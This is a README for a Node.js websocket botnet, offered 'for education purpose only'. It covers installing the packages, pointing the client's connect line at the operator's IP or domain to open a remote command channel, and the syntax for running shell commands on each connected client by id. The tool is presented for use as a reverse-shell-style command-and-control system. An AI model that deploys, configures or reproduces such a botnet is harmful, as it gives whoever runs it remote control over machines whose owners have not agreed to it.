
# Botnet using websocket (Node)

NodeJS Botnet using websocket to interact between clients & server. Use it at your own risks (for education purpose only).

## Installation

Use the package manager [npm](https://nodejs.org/en/download/) to install some packages (all includes in intallation.bat)

```bash
npm install websocket
npm install colors
npm install child_process
npm install http
npm install readline-sync
```

## Settings (same as reverse-shell-js)

edit the last line of client.js by adding your ip adress or using localhost if both of them are on the same network.
```javascript
client.connect('ws://IP-OR-DOMAIN:PORT', 'echo-protocol');
```
editing server.js for the connection port at port variable, line 8 :
```javascript
let port = 8080;
```

## Usage

> $ {id} shell_command

![image](https://user-images.githubusercontent.com/65828028/124164591-1f05dd80-daa1-11eb-99a8-974086eb4cde.png)

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
